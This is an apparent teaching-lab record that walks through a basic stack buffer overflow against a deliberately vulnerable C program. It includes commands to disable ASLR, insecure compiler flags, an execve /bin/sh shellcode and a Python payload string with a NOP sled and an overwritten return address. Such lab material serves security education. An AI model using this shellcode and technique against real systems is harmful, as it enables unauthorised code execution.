{"description":"Basic stack-based buffer overflow example","goal":"<p>Execute a simple buffer overflow by exploiting a vulnerable C program and injecting a shellcode on the stack!</p>\n<p><br /><br /></p>\n<p>&nbsp;</p>","solution":"<h2>Prolog</h2>\n<p>In this lab, we will show a basic buffer overflow. In order to do that, we first of all must get sure that&nbsp;<a title=\"ASLR\" href=\"https://en.wikipedia.org/wiki/Address_space_layout_randomization\">Address Space Layout Randomization</a> (ALSR) is disabled on the test machine.</p>\n<p>This can be done with the following command:</p>\n<p><code>&gt; cat /proc/sys/kernel/randomize_va_space<br /></code><br />If the contents of the file in question is zero, then we're all set.</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_01_aslr.png\" alt=\"Checking ASLR status in Linux\" /></p>\n<p><strong>Note: </strong>Possible values for ASLR in Linux are:</p>\n<ul>\n<li>0 --&gt; no randomization;</li>\n<li>1 --&gt; Conservative randomization. Shared libraries, stack, <code>mmap()</code>, VDSO and heap are randomized;</li>\n<li>2 &ndash; Full randomization. In addition to elements listed in the previous point, memory managed through <code>brk()</code> is also randomized.</li>\n</ul>\n<p>To disable ASLR you can hence write the following command:</p>\n<pre>echo 0 &gt; /proc/sys/kernel/randomize_va_space</pre>\n<p>To enable it:</p>\n<p>echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>\n<h3>The vulnerable program</h3>\n<p>The sample code for this lab is located in the \"/BufferOverflow\" folder of the hacking machine.</p>\n<pre>#include &lt;stdio.h&gt;<br />#include &lt;string.h&gt;<br /><br />void func(char* name){        <br />   char buf[100];        <br />   strcpy(buf,name);        <br />   printf(\"Benvenuto %s\\n\",buf);<br />}<br /><br />int main(int agrc,char** argv){<br />   func(argv[1]);        <br />   return 0;<br />}</pre>\n<p>As you can see from the code above, we pass a string to the program as a command line parameter. Such a string is then <strong>unsafely</strong> copied, via the <code>strcpy()</code> function, into the local variable <code>buf[]</code> within the <code>func()</code> function. Such a local variable will be used to carry out the exploit.</p>\n<h2>Compiling and testing the program</h2>\n<p>Let's use the <em>gcc</em> compiler, with the following flags:</p>\n<ul>\n<li><span style=\"font-size: inherit;\"><em><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">-fno-stack-protector --&gt;</span></code></em></span> do not emit extra code to check for buffer overflows;<span style=\"font-size: inherit;\"><em><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></em></span><span style=\"font-size: inherit;\"><em><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></em></span></li>\n<li><span style=\"font-size: inherit;\"><em>-no-pie --&gt; </em>do not produce a <em>Position Independent Executable</em> (PIE);</span></li>\n<li><span style=\"font-size: inherit;\"><em>-z execstack --&gt; </em>option passed straight to the linker </span><span class=\"pln\">and marking </span><span class=\"pln\">the object code as requiring executable </span><span class=\"typ\">stack;</span></li>\n<li><span style=\"font-size: inherit;\"><em>-ggdb --&gt; <code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"></code></em></span>Produce debugging information for use by GDB.</li>\n</ul>\n<p>Here is the whole command to be executed:</p>\n<pre><span id=\"LC7\">gcc -fno-stack-protector -no-pie -z execstack -o vuln vuln.c -ggd<code>b</code></span><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC7\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></pre>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_02_gcc.png\" alt=\"Compiling with gcc\" /></p>\n<p>Let's now run the program with a non-offending input...</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_03_NonOffendingInput.png\" alt=\"A &quot;safe&quot; run of the program\" /></p>\n<p>...and with an offending one (&gt;120 characters in input to the program)!</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_03_bis_OffendingInput.png\" alt=\"Crashing the vulnerable program\" width=\"3252\" height=\"296\" /></p>\n<h2>Analyzing the program with gdb</h2>\n<p>Let's now have a look at the program in gdb:</p>\n<p><code># gdb ./vuln</code></p>\n<p>&nbsp;</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_04_gdb_start.png\" alt=\"Launching the program under the gdb debugger\" /></p>\n<p>Let's disassemble the function func() and check the dimension of the buffer that gets allocated on the stack:</p>\n<p><code>(gdb) disas func</code></p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_05_gdb_disas_func.png\" alt=\"Disassembling a function with gdb\" /></p>\n<p><strong>Please note:</strong></p>\n<p>With gdb you can choose between two different dissassembly flavors, namely \"att\" and \"intel\". You can switch between the two through the \"set-disassembly-flavor\" gdb command, as shown in the picture below. As you will notice, there are a number of small differences between the two representations (like, e.g., the order in which source and destination operands are represented in the instruction).</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_06_gdb_assembly_flavors.png\" alt=\"Setting diassembly flavor in gdb\" width=\"1314\" height=\"1554\" /></p>\n<p>As you can see from the dump, the start of the memory area allocated to the buf[] local variable is 112 (0x70 exadecimal) bytes above the base pointer register (rbp). This means that the space we will have to fill with the <em>\"NOP sled + shellcode + padding\"</em> byte array is 112 + 8 (old frame pointer) bytes long. After those many bytes, we will find the return address, which will have to be properly replaced with an address falling more or less in the middle of the NOP sled itself.</p>\n<p>Let's hence move our atttention to the shellcode, which is the core of the exploit we want to make!</p>\n<h2>Creating (or downloading) a working shellcode</h2>\n<p>For this lab, we are going to use a very simple shellcode taken from the Exploit Database and available for download <a href=\"https://www.exploit-db.com/exploits/36858\">here</a>. The code in question basically launches a <em>/bin/sh</em> shell by calling the <em>execve</em> system call. Here is the binary code (in hexadecimal format):</p>\n<p class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC3\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05</span></code></p>\n<p>As you can see, the code in question is just 23 bytes long. If you want to give it a try before using it for the real exploit (just to get sure that it actually achieves what it is meant to), you can compile and run the program called <em>testShellScript.c </em>that is stored in the same folder as the vulnerable program you're trying to exploit.</p>\n<p>&nbsp;</p>\n<pre class=\" language-c\" style=\"box-sizing: border-box; font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace; font-size: 14.7px; margin: 0.5em 0px; overflow: auto; display: block; color: #000000; background: #f5f2f0; text-shadow: #ffffff 0px 1px; text-align: left; white-space: pre; word-spacing: 0px; word-break: normal; overflow-wrap: normal; line-height: 1.5; tab-size: 4; hyphens: none; padding: 1em; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code class=\" language-c\" style=\"box-sizing: border-box; font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace; font-size: inherit; color: #000000; word-break: normal; background: none; text-shadow: #ffffff 0px 1px; text-align: left; white-space: pre-wrap; word-spacing: normal; overflow-wrap: normal; line-height: 1.5; tab-size: 4; hyphens: none;\"><span class=\"token macro property\" style=\"box-sizing: border-box; color: #990055;\">#<span class=\"token directive keyword\" style=\"box-sizing: border-box; color: #0077aa;\">include</span> <span class=\"token string\" style=\"box-sizing: border-box; color: #669900;\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\" style=\"box-sizing: border-box; color: #990055;\">#<span class=\"token directive keyword\" style=\"box-sizing: border-box; color: #0077aa;\">include</span> <span class=\"token string\" style=\"box-sizing: border-box; color: #669900;\">&lt;string.h&gt;</span></span>\n\n<span class=\"token keyword\" style=\"box-sizing: border-box; color: #0077aa;\">int</span>\n<span class=\"token function\" style=\"box-sizing: border-box; color: #dd4a68;\">main</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token keyword\" style=\"box-sizing: border-box; color: #0077aa;\">void</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span>\n<span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">{</span>\n  <span class=\"token keyword\" style=\"box-sizing: border-box; color: #0077aa;\">char</span> <span class=\"token operator\" style=\"box-sizing: border-box; color: #9a6e3a; background: rgba(255, 255, 255, 0.5);\">*</span>shellcode <span class=\"token operator\" style=\"box-sizing: border-box; color: #9a6e3a; background: rgba(255, 255, 255, 0.5);\">=</span> <span class=\"token string\" style=\"box-sizing: border-box; color: #669900;\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\"</span>\n    <span class=\"token string\" style=\"box-sizing: border-box; color: #669900;\">\"\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">;</span>\n\n  <span class=\"token function\" style=\"box-sizing: border-box; color: #dd4a68;\">printf</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token string\" style=\"box-sizing: border-box; color: #669900;\">\"strlen(shellcode)=%d\\n\"</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">,</span> <span class=\"token function\" style=\"box-sizing: border-box; color: #dd4a68;\">strlen</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span>shellcode<span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">;</span>\n\n  <span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token keyword\" style=\"box-sizing: border-box; color: #0077aa;\">void</span> <span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token operator\" style=\"box-sizing: border-box; color: #9a6e3a; background: rgba(255, 255, 255, 0.5);\">*</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token keyword\" style=\"box-sizing: border-box; color: #0077aa;\">void</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span>shellcode<span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">(</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">)</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">;</span>\n\n  <span class=\"token keyword\" style=\"box-sizing: border-box; color: #0077aa;\">return</span> <span class=\"token number\" style=\"box-sizing: border-box; color: #990055;\">0</span><span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">;</span>\n<span class=\"token punctuation\" style=\"box-sizing: border-box; color: #999999;\">}</span></code></pre>\n<p><br />In order to do so, just type the following command in your command shell:</p>\n<p><code>&gt; gcc -o testShellCode testShellCode.c</code></p>\n<p>You can then run it (e.g., in gdb) and see what happens...</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_07_gdb_test_shell_code.png\" alt=\"Testing correct behavior of the shell code\" /></p>\n<p>As you can see, the code in question actually achieved the goal, i.e. launching a command shell on the target machine. We can hence move on...</p>\n<h2>Crafting the \"stack smashing\" string</h2>\n<p>What we need now is a proper string that meets all of the following requirements:</p>\n<ol>\n<li>It contains a sufficient number of NOP bytes, so to allow for a certain degree of precision lack with respect to the chosen modified return address;</li>\n<li>It contains the 23 bytes long shellcode we discussed earlier;</li>\n<li>It contains a few padding bytes allowing to fill the memory gap between the end of the shell code and the start of the stack area containing the return address (such bytes will also cover the area occupied by the old frame pointer);</li>\n<li>It has a trailer that is (in Intel's little endian format) the modified return address.</li>\n</ol>\n<p>In a nutshell, here is how the stack smashing string should look like:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC17\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">[NOP (e.g., 80 bytes)][SHELLCODE (23 bytes)][PADDING (DIM(buff) - # of NOPs - DIM(shellcode) = 120-80-23=17][MODIFIED_RET_ADDRESS]<br /></span><span id=\"LC19\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"></span></code></pre>\n<p><strong>Please Note: </strong>Intel 64-bit architectures define canonicalized address spaces, as explained <a href=\"https://en.wikipedia.org/wiki/X86-64\">here</a>. This means that the [MODIFIED_RET_ADDRESS] above can be represented with just 6 bytes (the least significant ones) and will be sign-extended to 64bits.</p>\n<p>With the help of a little python code, we can build such a string with a command like this:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC26\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">python -c 'print \"\\x90\"*80+</span><span id=\"LC27\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span><span id=\"LC28\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">+\"A\"*17+ \"B\"*6'</span></code></pre>\n<p>Let's hence give a try and run the target program in gdb, by submitting the stack smashing string as the program argument:</p>\n<p>&nbsp;<img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_08_gdb_crashing_string.png\" alt=\"Crashing the program in gdb\" /></p>\n<p>Great! The program just crashed...and this is exactly what we were aiming at ;-)</p>\n<p>Let's now take a look at both processor registers and memory state. First, the resgisters:</p>\n<p><code>(gdb) i r</code></p>\n<p>&nbsp;</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_09_gdb_i_r.png\" alt=\"Inspecting processor's registers\" /></p>\n<p>Notice that the Base Pointer (<em>rbp</em>) has been overwritten with the sequence of hexadecimal bytes \"0x4141414141414141\", i.e., all \"A\" letters, as expected. As to the Instruction Register (<em>rip</em>), it is now filled with 6 \"0x42\" bytes, that is to say \"B\" letters. This is exactly what we had in mind. What we need to do now is to replace such B letters with a \"reasonable\" address falling more or less in the middle of the NOP sled.</p>\n<p>Let's hence move to the analysis of the stack itself. With a command like the following:</p>\n<p><code>(gdb) x /10s $rsp-120</code></p>\n<p>we can print the content of memory ('x' command), starting 120 bytes above the current Stack Pointer ('$rsp-120'), under the form of 10 strings ('/10s'). Here is the output of such a command in our case:</p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_10_gdb_x_10_s.png\" alt=\"Printing the content of the stack in string format\" /></p>\n<p>As you can see from the output, the injected stack smashing string starts at address <em>0x7fffffffe568.</em> This is hence a good candidate for the replacement of the trailing B's we have used in the previous run. In order to build such a trailing string and make it compliant to the required little endian representation characterizing Intel processors, we can once again ask for some help from python, as suggested below:<em><br /></em></p>\n<p><code>\"\\x7f\\xff\\xff\\xff\\xe5\\x68\"[::-1]</code></p>\n<p>This basically reads in the single bytes and writes tem back in reversed order. The modified stack smashing string now becomes the following:</p>\n<pre class=\"code highlight\" style=\"box-sizing: border-box; overflow: auto hidden; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: 13px !important; display: block; padding: 10px; margin: 0px; line-height: 1.5 !important; word-break: break-all; overflow-wrap: normal; color: #333333; background-color: #ffffff; border-top: none #f0f0f0; border-right: none #f0f0f0; border-bottom: none #f0f0f0; border-left: 1px solid #f0f0f0; border-image: initial; border-radius: 0px; text-shadow: none; white-space: pre; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;\"><code style=\"box-sizing: border-box; font-family: Menlo, 'Liberation Mono', Consolas, 'DejaVu Sans Mono', 'Ubuntu Mono', 'Courier New', 'andale mono', 'lucida console', monospace; font-size: inherit; padding: 0px; color: inherit; background-color: transparent; border-radius: 0px; white-space: pre; overflow-wrap: normal;\"><span id=\"LC26\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">python -c 'print \"\\x90\"*80+</span><span id=\"LC27\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span><span id=\"LC28\" class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">+\"A\"*17+</span></code>\"\\x7f\\xff\\xff\\xff\\xe5\\x68\"[::-1]'</pre>\n<p><span class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">Let's now try such a new string and see what happens:</span></p>\n<p><span class=\"line\" style=\"box-sizing: border-box; display: inline-block;\"><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_11_gdb_exploit.png\" alt=\"Smashing the stack!\" /></span></p>\n<p><span class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">Bang! The exploit has worked like a charm. The shellcode has been executed and we have been provided with a brand new shell we can use for our purposes.</span></p>\n<p><span class=\"line\" style=\"box-sizing: border-box; display: inline-block;\">In a real exploit, the attacker would actually replace the return address with an address that falls more or less in the middle of the NOP sled. In the example above, considering that the first NOP is stored at the mentioned 0x7fffffffe568 address and that we have 80 NOPs, a good candidate would be an address like 0x7fffffffe5a8, that is exactly 40 bytes away from the start of the sled. The picture below reports the result of the execution of the program with a stack smashing string crafted in this way.</span></p>\n<p><img src=\"https://raw.githubusercontent.com/NS-unina/DSP_Repo/master/L10_BufferOverflow_1/.images/L10_12_gdb_exploit_mid_nop.png\" alt=\"Crafting a return address in the middle of the NOP sled.\" /></p>\n<p>&nbsp;</p>","author":"spromano"}
